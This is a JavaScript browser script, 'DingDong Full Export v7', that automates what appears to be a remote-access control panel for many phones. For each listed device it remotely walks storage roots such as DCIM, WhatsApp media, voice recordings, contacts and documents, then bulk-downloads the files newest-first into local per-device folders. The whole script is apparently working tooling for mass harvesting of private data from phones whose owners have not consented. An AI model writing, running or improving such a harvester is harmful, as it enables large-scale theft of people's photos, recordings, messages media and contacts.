/**
 * DingDong One-Click Folder Export v7 — Whole-phone, latest-first, junk-skipping
 *
 * Changes vs v6:
 *  - Scans MANY roots (DCIM, Pictures, Download(s), Documents, WhatsApp,
 *    Android/media/com.whatsapp, com.whatsapp.w4b, Music, Recordings,
 *    Voice Recorder, Sounds, Movies, Notifications, Ringtones, Contacts).
 *    Missing roots are skipped silently.
 *  - Two-phase run: PHASE 1 indexes every file (path, size, date) without
 *    downloading. PHASE 2 sorts globally newest-first (day-bucketed) and
 *    downloads day by day: today → yesterday → … until done.
 *  - Priority extensions (photos, audio/recordings, contacts, txt, pdf,
 *    office docs) are always saved. Junk extensions (apk, ipa, exe, dmg,
 *    iso, img, obb, zip/rar/7z, big video containers) are skipped when
 *    they exceed MAX_JUNK_BYTES. Anything unknown is skipped if larger
 *    than MAX_UNKNOWN_BYTES.
 *  - Same robust absolute-path walker from v6 (var32 + setdatcmd + cdAbs
 *    + re-snapshot every iteration). Nothing from v6 was removed.
 *
 * Output: <picked>/DingDong_Full_<ts>/<UID - label>/<root>/<...>/file
 */
(function () {
  "use strict";

  const CFG = {
    CLICK_SETTLE: 1500,
    NAV_WAIT_MAX: 6000,
    NAV_POLL: 150,
    PREVIEW_TRIES: 20,
    PREVIEW_STEP: 250,
    MAX_DEPTH: 14,
    BETWEEN_FILES: 150,

    // Size guards (bytes)
    MAX_JUNK_BYTES:    5 * 1024 * 1024,   // junk ext bigger than this → skip
    MAX_UNKNOWN_BYTES: 50 * 1024 * 1024,  // unknown ext bigger than this → skip
    MAX_ANY_BYTES:    250 * 1024 * 1024,  // hard ceiling for ANY file (even priority)

    // Roots to try, in priority order. Missing ones are skipped.
    ROOTS: [
      "DCIM",
      "Pictures",
      "Download",
      "Downloads",
      "Documents",
      "WhatsApp",
      "Android/media/com.whatsapp",
      "Android/media/com.whatsapp.w4b",
      "Recordings",
      "Voice Recorder",
      "Sounds",
      "Music",
      "Notifications",
      "Ringtones",
      "Contacts",
      "Movies", // filtered hard by size
    ],
  };

  // File classifications
  const PRIORITY_EXT = new Set([
    // images
    "jpg","jpeg","png","heic","heif","webp","gif","bmp","tif","tiff","svg","raw","dng",
    // audio / recordings
    "mp3","wav","m4a","aac","opus","ogg","amr","flac","3ga","wma",
    // docs
    "pdf","txt","md","rtf","doc","docx","xls","xlsx","ppt","pptx","csv","odt","ods","odp",
    // contacts / calendar
    "vcf","vcard","ics",
    // small data
    "json","xml","html","htm",
  ]);
  const JUNK_EXT = new Set([
    "apk","xapk","apks","ipa","exe","msi","dmg","pkg","iso","img","obb",
    "zip","rar","7z","tar","gz","bz2","xz",
    "mkv","avi","mov","wmv","flv","ts","m2ts","webm","mpg","mpeg","vob",
    // mp4 handled specially (kept if small)
  ]);
  const MEDIUM_VIDEO_EXT = new Set(["mp4","m4v","3gp"]); // kept only if within MAX_UNKNOWN_BYTES

  const sleep = ms => new Promise(r => setTimeout(r, ms));
  const log  = (...a) => console.log ("%c[DD]", "color:#0ff;font-weight:bold", ...a);
  const warn = (...a) => console.warn("%c[DD]", "color:#f90;font-weight:bold", ...a);
  const fmt  = b => b < 1024 ? b + " B" : b < 1048576 ? (b / 1024).toFixed(1) + " KB" : (b / 1048576).toFixed(1) + " MB";
  const safe = s => (s || "_").replace(/[<>:"|?*\\]/g, "_").replace(/\/+/g, "/").replace(/^\/+|\/+$/g, "");
  const hasFSA = () => typeof window.showDirectoryPicker === "function";
  const extOf  = n => { const i = n.lastIndexOf("."); return i < 0 ? "" : n.slice(i + 1).toLowerCase(); };

  const S = {
    rootDir: null,
    running: false,
    users: [],
    stats: { indexed: 0, planned: 0, done: 0, skipped: 0, failed: 0, bytes: 0 },
  };

  /* ---------- UI (unchanged from v6, only label tweaks) ---------- */
  function panel() {
    if (document.getElementById("dd-panel")) return;
    const p = document.createElement("div");
    p.id = "dd-panel";
    p.innerHTML = `
      <style>
        #dd-panel{position:fixed;bottom:12px;right:12px;width:380px;max-height:65vh;
          background:#0b0f15f0;border:1px solid #0ff7;border-radius:12px;color:#ddd;
          font:12px/1.4 ui-monospace,monospace;z-index:2147483647;overflow:hidden;
          display:flex;flex-direction:column;box-shadow:0 8px 30px #000a;}
        #dd-panel header{padding:10px 12px;background:#0ff1;color:#0ff;font-weight:bold;
          display:flex;justify-content:space-between;align-items:center;}
        #dd-panel header button{background:#0ff;color:#000;border:0;border-radius:6px;
          padding:6px 10px;cursor:pointer;font-weight:bold;font-size:12px;}
        #dd-list{padding:8px 10px;overflow:auto;flex:1;}
        #dd-panel .u{margin:5px 0;padding:6px 8px;background:#fff1;border-radius:6px;}
        #dd-panel .u b{color:#fff;font-size:11px;display:block;}
        #dd-panel .u span{color:#aaa;font-size:10.5px;}
        #dd-panel .bar{height:4px;background:#222;border-radius:2px;margin-top:4px;overflow:hidden;}
        #dd-panel .fill{height:100%;background:linear-gradient(90deg,#0ff,#0f9);transition:width .3s;}
        #dd-sum{padding:8px 12px;background:#0001;color:#0f9;font-size:11px;border-top:1px solid #fff1;}
        #dd-pick{padding:14px;text-align:center;}
        #dd-pick button{background:#0ff;color:#000;border:0;border-radius:8px;
          padding:12px 18px;cursor:pointer;font-weight:bold;font-size:13px;}
        #dd-pick small{display:block;color:#888;margin-top:8px;font-size:10.5px;}
      </style>
      <header>
        <span>🛰 DingDong Full Export v7</span>
        <button id="dd-stop" style="display:none;background:#f55;color:#fff">Stop</button>
      </header>
      <div id="dd-pick">
        <button id="dd-start">📁 Pick Folder &amp; Start</button>
        <small>Scans whole phone, latest day first, skips junk (APK/big video).<br>
        Chrome / Edge / Opera required.</small>
      </div>
      <div id="dd-list" style="display:none"></div>
      <div id="dd-sum" style="display:none">Idle.</div>`;
    document.body.appendChild(p);
    document.getElementById("dd-start").onclick = startFlow;
    document.getElementById("dd-stop").onclick = () => { S.running = false; sum("⏹ Stopping…"); };
  }
  function upd(uid, label, status, pct) {
    let el = document.getElementById("dd-u-" + uid);
    if (!el) {
      el = document.createElement("div"); el.className = "u"; el.id = "dd-u-" + uid;
      el.innerHTML = `<b></b><span></span><div class="bar"><div class="fill"></div></div>`;
      document.getElementById("dd-list").appendChild(el);
    }
    el.querySelector("b").textContent = label || uid;
    el.querySelector("span").textContent = status || "";
    el.querySelector(".fill").style.width = (pct || 0) + "%";
  }
  const sum = t => { const s = document.getElementById("dd-sum"); if (s) s.textContent = t; };

  /* ---------- discover users ---------- */
  function discover() {
    const out = [];
    document.querySelectorAll(".usr").forEach(div => {
      const btn = div.querySelector("button[onclick*='setdev']");
      if (!btn) return;
      const m = (btn.getAttribute("onclick") || "").match(/setdev\(['"]([^'"]+)['"]\)/);
      if (!m) return;
      const label = div.textContent.replace(/\s+/g, " ").trim().substring(0, 60);
      out.push({ uid: m[1], label, btn });
    });
    return out;
  }

  /* ---------- DOM helpers (v6 + metadata parsing) ---------- */
  const $resp  = () => document.getElementById("resp");
  const $fprev = () => document.getElementById("fprev");
  const fprevOpen = () => { const f = $fprev(); return f && getComputedStyle(f).display !== "none"; };
  const getEntries = () => { const r = $resp(); return r ? Array.from(r.querySelectorAll("li")) : []; };
  const entryName = li => {
    const c = li.cloneNode(true);
    c.querySelectorAll("b").forEach(b => b.remove());
    return c.textContent.replace(/\s+/g, " ").trim();
  };
  const entryMetaText = li =>
    Array.from(li.querySelectorAll("b")).map(b => b.textContent).join(" ").trim();

  // Parse "1.2 MB", "500 KB", "800 B", "3 GB" → bytes; null if not found
  function parseSize(text) {
    if (!text) return null;
    const m = text.match(/(\d+(?:[.,]\d+)?)\s*(B|KB|MB|GB|TB)\b/i);
    if (!m) return null;
    const n = parseFloat(m[1].replace(",", "."));
    const u = m[2].toUpperCase();
    const mul = { B: 1, KB: 1024, MB: 1048576, GB: 1073741824, TB: 1099511627776 }[u];
    return Math.round(n * mul);
  }
  // Parse common date formats → epoch ms; null if not found
  function parseDate(text) {
    if (!text) return null;
    // 2026-09-04 15:30, 2026/09/04, 04-09-2026, 04/09/2026 15:30
    let m = text.match(/(\d{4})[-/.](\d{1,2})[-/.](\d{1,2})(?:[ T](\d{1,2}):(\d{2}))?/);
    if (m) {
      const [, y, mo, d, hh = "0", mm = "0"] = m;
      const t = Date.UTC(+y, +mo - 1, +d, +hh, +mm);
      if (!isNaN(t)) return t;
    }
    m = text.match(/(\d{1,2})[-/.](\d{1,2})[-/.](\d{2,4})(?:\s+(\d{1,2}):(\d{2}))?/);
    if (m) {
      let [, d, mo, y, hh = "0", mm = "0"] = m;
      if (y.length === 2) y = "20" + y;
      const t = Date.UTC(+y, +mo - 1, +d, +hh, +mm);
      if (!isNaN(t)) return t;
    }
    return null;
  }
  const dayKey = ms => {
    if (ms == null) return "unknown";
    const d = new Date(ms);
    return d.getUTCFullYear() + "-" + String(d.getUTCMonth() + 1).padStart(2, "0") + "-" + String(d.getUTCDate()).padStart(2, "0");
  };

  const isFolder = li => li.classList.contains("fo");
  const isBack   = li => entryName(li).startsWith("..");
  const curPath  = () => (typeof window.var32 === "string" ? window.var32 : "");

  function closeFprev() {
    const f = $fprev(); if (!f) return;
    const x = f.querySelector("span.span");
    if (x) try { x.click(); } catch (_) {}
    f.style.display = "none";
  }

  /* ---------- absolute-path navigation (unchanged) ---------- */
  async function cdAbs(absPath) {
    if (typeof window.setdatcmd !== "function") { warn("setdatcmd missing", absPath); return false; }
    const beforeSig = entriesSig();
    try { window.setdatcmd("cd", absPath, "", window.respov); }
    catch (e) { warn("cd threw", absPath, e); return false; }
    const t0 = Date.now();
    while (Date.now() - t0 < CFG.NAV_WAIT_MAX) {
      await sleep(CFG.NAV_POLL);
      if (curPath() === absPath || entriesSig() !== beforeSig) break;
    }
    await sleep(200);
    return true;
  }
  function entriesSig() {
    return getEntries().map(li => (isFolder(li) ? "D:" : "F:") + entryName(li)).join("|");
  }
  async function clickFolderByName(name) {
    const li = getEntries().find(x => isFolder(x) && entryName(x) === name);
    if (!li) return false;
    const beforeSig = entriesSig();
    li.click();
    const t0 = Date.now();
    while (Date.now() - t0 < CFG.NAV_WAIT_MAX) {
      await sleep(CFG.NAV_POLL);
      if (entriesSig() !== beforeSig) break;
    }
    await sleep(200);
    return true;
  }
  async function goHome() {
    // click ".." until we can't anymore, or until listing looks like the top
    for (let i = 0; i < 20; i++) {
      const back = getEntries().find(isBack);
      if (!back) break;
      const beforeSig = entriesSig();
      back.click();
      const t0 = Date.now();
      while (Date.now() - t0 < CFG.NAV_WAIT_MAX) {
        await sleep(CFG.NAV_POLL);
        if (entriesSig() !== beforeSig) break;
      }
      await sleep(150);
    }
  }
  // Navigate to a root path like "Android/media/com.whatsapp" from home
  async function cdRootByClicks(rootPath) {
    await goHome();
    const parts = rootPath.split("/").filter(Boolean);
    for (const seg of parts) {
      const ok = await clickFolderByName(seg);
      if (!ok) return false;
    }
    return curPath() || null;
  }

  /* ---------- FS helpers ---------- */
  async function ensureDir(parent, segments) {
    let d = parent;
    for (const seg of segments) {
      const name = safe(seg) || "_";
      if (!name) continue;
      d = await d.getDirectoryHandle(name, { create: true });
    }
    return d;
  }
  async function writeFile(dirHandle, fileName, blob) {
    const fh = await dirHandle.getFileHandle(safe(fileName) || "file", { create: true });
    const w = await fh.createWritable();
    await w.write(blob);
    await w.close();
  }

  /* ---------- classification / skip logic ---------- */
  function decide(name, sizeBytes) {
    const ext = extOf(name);
    const size = sizeBytes ?? 0;
    if (sizeBytes != null && sizeBytes > CFG.MAX_ANY_BYTES)
      return { skip: true, reason: `>ceiling ${fmt(sizeBytes)}` };
    if (PRIORITY_EXT.has(ext))
      return { skip: false, priority: 0, reason: "priority" };
    if (JUNK_EXT.has(ext)) {
      if (sizeBytes != null && sizeBytes > CFG.MAX_JUNK_BYTES)
        return { skip: true, reason: `junk ${ext} ${fmt(sizeBytes)}` };
      return { skip: false, priority: 2, reason: "small-junk-ok" };
    }
    if (MEDIUM_VIDEO_EXT.has(ext)) {
      if (sizeBytes != null && sizeBytes > CFG.MAX_UNKNOWN_BYTES)
        return { skip: true, reason: `video ${fmt(sizeBytes)}` };
      return { skip: false, priority: 1, reason: "small-video" };
    }
    // unknown
    if (sizeBytes != null && sizeBytes > CFG.MAX_UNKNOWN_BYTES)
      return { skip: true, reason: `unknown-large ${fmt(sizeBytes)}` };
    return { skip: false, priority: 2, reason: "unknown-ok" };
  }

  /* ---------- PHASE 1: INDEX ---------- */
  // Walks a folder and pushes {absDir, name, rel, size, date} into index.
  async function indexWalk(u, absPath, relPath, depth, index) {
    if (!S.running || depth > CFG.MAX_DEPTH) return;
    if (curPath().replace(/\/+$/, "") !== absPath.replace(/\/+$/, "")) await cdAbs(absPath);

    const snap = getEntries()
      .filter(li => !isBack(li))
      .map(li => {
        const meta = entryMetaText(li);
        return {
          name: entryName(li),
          folder: isFolder(li),
          size: parseSize(meta),
          date: parseDate(meta),
        };
      })
      .filter(e => e.name);

    upd(u.uid, u.label, `🔍 index ${relPath} (${snap.length})`, Math.min(25, 5 + depth * 2));

    for (const e of snap) {
      if (!S.running) return;
      if (e.folder) {
        const childAbs = absPath.replace(/\/+$/, "") + "/" + e.name;
        const ok = await cdAbs(childAbs);
        if (!ok) { await cdAbs(absPath); await clickFolderByName(e.name); }
        await indexWalk(u, childAbs, relPath + e.name + "/", depth + 1, index);
        await cdAbs(absPath);
      } else {
        const decision = decide(e.name, e.size);
        index.push({
          absDir: absPath,
          name: e.name,
          rel: relPath + e.name,
          size: e.size,
          date: e.date,
          skip: decision.skip,
          reason: decision.reason,
          priority: decision.priority ?? 3,
        });
        S.stats.indexed++;
      }
    }
  }

  /* ---------- PHASE 2: DOWNLOAD one file ---------- */
  async function downloadOne(u, userDir, item, manifest) {
    // navigate to its folder
    if (curPath().replace(/\/+$/, "") !== item.absDir.replace(/\/+$/, "")) {
      await cdAbs(item.absDir);
    }
    const li = getEntries().find(x => !isFolder(x) && entryName(x) === item.name);
    if (!li) { warn(`[${u.uid}] vanished: ${item.rel}`); S.stats.failed++; return; }
    li.click();
    let href = null;
    for (let i = 0; i < CFG.PREVIEW_TRIES; i++) {
      await sleep(CFG.PREVIEW_STEP);
      const a = document.getElementById("btdwn");
      const h = a && (a.href || a.getAttribute("href"));
      if (fprevOpen() && h && h !== "hh" && h !== "#" && !h.startsWith("javascript")) { href = h; break; }
    }
    if (!href) {
      warn(`[${u.uid}] no URL ${item.rel}`);
      S.stats.failed++;
      manifest.push({ ...item, error: "no url" });
      closeFprev();
      return;
    }
    try {
      const r = await fetch(href, { cache: "no-store" });
      if (!r.ok) throw new Error("HTTP " + r.status);
      const blob = await r.blob();
      // final safety: if real size explodes past ceiling, still write it
      const parts = item.rel.split("/").filter(Boolean);
      const fname = parts.pop() || "file";
      const sub = parts.length ? await ensureDir(userDir, parts) : userDir;
      await writeFile(sub, fname, blob);
      S.stats.bytes += blob.size;
      S.stats.done++;
      manifest.push({ ...item, savedBytes: blob.size });
      upd(u.uid, u.label, `✅ ${item.rel} · ${fmt(blob.size)}`, 60);
    } catch (e) {
      S.stats.failed++;
      manifest.push({ ...item, error: String(e.message || e) });
      warn(`[${u.uid}] save fail`, item.rel, e.message || e);
    } finally {
      closeFprev();
      await sleep(CFG.BETWEEN_FILES);
      await cdAbs(item.absDir);
    }
  }

  /* ---------- per-user pipeline ---------- */
  async function processUser(u, userDir) {
    upd(u.uid, u.label, "selecting…", 2);
    u.btn.click();
    await sleep(CFG.CLICK_SETTLE);
    const fm = document.querySelector('[onclick="filesmanager()"]');
    if (!fm) { upd(u.uid, u.label, "⚠ no FM", 0); return; }
    fm.click();
    await sleep(CFG.CLICK_SETTLE);
    const t0 = Date.now();
    while (Date.now() - t0 < CFG.NAV_WAIT_MAX && getEntries().length === 0) await sleep(CFG.NAV_POLL);

    // Phase 1: index every configured root
    const index = [];
    for (const rootRel of CFG.ROOTS) {
      if (!S.running) return;
      upd(u.uid, u.label, `open /${rootRel}`, 5);
      const abs = await cdRootByClicks(rootRel);
      if (!abs) { log(`[${u.uid}] skip missing root ${rootRel}`); continue; }
      await indexWalk(u, abs, safe(rootRel) + "/", 0, index);
    }

    // Filter + sort: latest first (by day), then priority within day, then size asc
    const planned = index
      .filter(x => !x.skip)
      .sort((a, b) => {
        const ad = a.date ?? -Infinity, bd = b.date ?? -Infinity;
        if (bd !== ad) return bd - ad;                 // newest first
        if (a.priority !== b.priority) return a.priority - b.priority; // priority first
        return (a.size ?? 0) - (b.size ?? 0);          // small before large
      });
    const skipped = index.length - planned.length;
    S.stats.planned += planned.length;
    S.stats.skipped += skipped;

    upd(u.uid, u.label, `📋 ${planned.length} to save, ${skipped} skipped`, 30);
    log(`[${u.uid}] plan`, { total: index.length, planned: planned.length, skipped });

    // Write plan.json for transparency
    try {
      await writeFile(userDir, "_plan.json",
        new Blob([JSON.stringify({ uid: u.uid, label: u.label, planned, skipped: index.filter(x => x.skip) }, null, 2)],
          { type: "application/json" }));
    } catch (_) {}

    // Phase 2: download day by day, newest day first
    const manifest = [];
    const byDay = new Map();
    for (const it of planned) {
      const k = dayKey(it.date);
      if (!byDay.has(k)) byDay.set(k, []);
      byDay.get(k).push(it);
    }
    const days = Array.from(byDay.keys()).sort((a, b) => {
      if (a === "unknown") return 1;
      if (b === "unknown") return -1;
      return a < b ? 1 : a > b ? -1 : 0;
    });

    let i = 0;
    for (const day of days) {
      if (!S.running) break;
      const bucket = byDay.get(day);
      upd(u.uid, u.label, `📅 ${day} · ${bucket.length} files`, 35);
      for (const item of bucket) {
        if (!S.running) break;
        i++;
        await downloadOne(u, userDir, item, manifest);
        const pct = 35 + Math.round((i / planned.length) * 60);
        sum(`💾 ${S.stats.done}/${S.stats.planned} saved · ${fmt(S.stats.bytes)} · ${S.stats.failed} failed · ${S.stats.skipped} skipped`);
        upd(u.uid, u.label, `📅 ${day} · ${i}/${planned.length}`, Math.min(95, pct));
      }
    }

    try {
      await writeFile(userDir, "_manifest.json",
        new Blob([JSON.stringify({ uid: u.uid, label: u.label, manifest }, null, 2)],
          { type: "application/json" }));
    } catch (_) {}
    upd(u.uid, u.label, `✅ ${manifest.filter(x => !x.error).length}/${planned.length} saved`, 100);
  }

  /* ---------- main flow ---------- */
  async function startFlow() {
    if (S.running) return;
    if (!hasFSA()) {
      alert("Your browser doesn't support direct folder writes.\nUse Chrome / Edge / Opera.");
      return;
    }
    try {
      S.rootDir = await window.showDirectoryPicker({ id: "dingdong-full", mode: "readwrite" });
    } catch (_) { return; }

    const btn = document.getElementById("dd-start");
    btn.disabled = true; btn.textContent = "Running…";
    document.getElementById("dd-list").style.display = "";
    document.getElementById("dd-sum").style.display = "";
    document.getElementById("dd-stop").style.display = "";

    S.running = true;
    S.stats = { indexed: 0, planned: 0, done: 0, skipped: 0, failed: 0, bytes: 0 };
    sum("Discovering users…");
    let users = discover();
    for (let i = 0; i < 6 && users.length === 0; i++) { await sleep(1500); users = discover(); }
    if (!users.length) {
      sum("❌ No users found.");
      S.running = false;
      btn.disabled = false; btn.textContent = "📁 Pick Folder & Start (again)";
      return;
    }
    S.users = users;
    sum(`Found ${users.length} users — full export starting…`);
    const sessionDir = await S.rootDir.getDirectoryHandle(
      "DingDong_Full_" + new Date().toISOString().replace(/[:.]/g, "-").slice(0, 19),
      { create: true });

    for (const u of users) {
      if (!S.running) break;
      try {
        const dirName = safe(`${u.uid} - ${u.label}`);
        const userDir = await sessionDir.getDirectoryHandle(dirName, { create: true });
        await processUser(u, userDir);
      } catch (e) {
        warn("user err", u.uid, e);
        upd(u.uid, u.label, "⚠ " + (e.message || e), 0);
      }
    }

    sum(`🏁 ${S.stats.done}/${S.stats.planned} saved · ${fmt(S.stats.bytes)} · ${S.stats.failed} failed · ${S.stats.skipped} skipped junk`);
    btn.disabled = false; btn.textContent = "📁 Pick Folder & Start (again)";
    document.getElementById("dd-stop").style.display = "none";
    S.running = false;
  }

  window.DingDong = { start: startFlow, state: S, discover, cfg: CFG };
  if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", panel);
  else panel();
})();
